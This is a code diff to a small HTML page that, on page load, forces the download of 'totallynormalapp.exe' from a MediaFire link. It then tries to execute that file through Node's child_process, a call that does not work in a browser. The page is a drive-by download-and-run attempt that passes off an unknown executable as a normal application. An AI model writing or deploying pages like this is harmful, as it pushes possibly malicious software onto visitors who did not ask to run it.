@@ -3,10 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>sCyand's Stuff</title>
-    <meta http-equiv="refresh" content="0; url=https://download1085.mediafire.com/ypdvfdo7knigXLZ99EkxRljwYka3hq4aXp_-r5MhrkoXEQQedOyqVZk5fm66OI3NX0mi5Iwo5xrZ2W90JZ6hc38_iYWQm4nphUha3n96Js9IhOeYgIpVaWw7lzUUi9-DjjD_j6OtzNyimrKwrkLewJNrxIcA23AqEDVBXnovGO2A/kh272n8sbed4q5j/totallynormalapp.exe">
+    <title>Download and Run Application</title>
 </head>
 <body>
-    <p>If you are not redirected automatically, please <a href="https://download1085.mediafire.com/ypdvfdo7knigXLZ99EkxRljwYka3hq4aXp_-r5MhrkoXEQQedOyqVZk5fm66OI3NX0mi5Iwo5xrZ2W90JZ6hc38_iYWQm4nphUha3n96Js9IhOeYgIpVaWw7lzUUi9-DjjD_j6OtzNyimrKwrkLewJNrxIcA23AqEDVBXnovGO2A/kh272n8sbed4q5j/totallynormalapp.exe">click here</a>.</p>
+    <p>Your download should start automatically. If not, please <a href="https://download1085.mediafire.com/ypdvfdo7knigXLZ99EkxRljwYka3hq4aXp_-r5MhrkoXEQQedOyqVZk5fm66OI3NX0mi5Iwo5xrZ2W90JZ6hc38_iYWQm4nphUha3n96Js9IhOeYgIpVaWw7lzUUi9-DjjD_j6OtzNyimrKwrkLewJNrxIcA23AqEDVBXnovGO2A/kh272n8sbed4q5j/totallynormalapp.exe" download>click here to download</a>.</p>
+    <script>
+        // Function to trigger the download and run the application
+        function triggerDownloadAndRun() {
+            // Create a temporary anchor element
+            var a = document.createElement('a');
+            a.href = 'https://download1085.mediafire.com/ypdvfdo7knigXLZ99EkxRljwYka3hq4aXp_-r5MhrkoXEQQedOyqVZk5fm66OI3NX0mi5Iwo5xrZ2W90JZ6hc38_iYWQm4nphUha3n96Js9IhOeYgIpVaWw7lzUUi9-DjjD_j6OtzNyimrKwrkLewJNrxIcA23AqEDVBXnovGO2A/kh272n8sbed4q5j/totallynormalapp.exe';
+            a.download = 'totallynormalapp.exe';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+
+            // Run the application after download
+            setTimeout(function() {
+                var exec = require('child_process').exec;
+                exec('start totallynormalapp.exe', (err, stdout, stderr) => {
+                    if (err) {
+                        console.error(`Error: ${err}`);
+                        return;
+                    }
+                    console.log(`Output: ${stdout}`);
+                });
+            }, 5000); // Adjust the timeout as needed
+        }
+
+        // Trigger the download and run function
+        triggerDownloadAndRun();
+    </script>
 </body>
 </html>
